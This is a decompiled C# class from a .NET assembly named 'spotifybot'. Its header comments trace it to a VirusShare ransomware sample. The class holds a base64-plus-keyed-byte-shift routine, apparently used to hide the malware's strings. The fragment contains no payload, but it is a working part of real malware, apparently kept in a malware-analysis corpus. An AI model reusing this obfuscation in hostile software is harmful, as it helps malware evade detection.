// Decompiled with JetBrains decompiler
// Type: RUDUUFDP
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;

public class RUDUUFDP
{
  public static string CPMXFIPG(string Input, string GFEPPV)
  {
    string str;
    try
    {
      str = Encoding.UTF8.GetString(RUDUUFDP.DFQMHV(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(GFEPPV)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static byte[] DFQMHV(byte[] Input, byte[] GFEPPV)
  {
    int num1 = (int) Input[checked (Input.Length - 1)];
    byte[] numArray1 = new byte[checked (Input.Length - 2 + 1)];
    short index1 = 0;
    byte[] numArray2;
    try
    {
      int num2 = checked (Input.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        if ((int) index1 >= GFEPPV.Length)
          index1 = (short) 0;
        if (index2 < checked (Input.Length - 1))
        {
          numArray1[index2] = Convert.ToByte(checked ((int) Input[index2] - unchecked (numArray1.Length % GFEPPV.Length) - (int) GFEPPV[(int) index1] + num1));
          checked { ++index1; }
        }
        checked { ++index2; }
      }
      numArray2 = numArray1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray2 = numArray1;
      ProjectData.ClearProjectError();
    }
    return numArray2;
  }
}
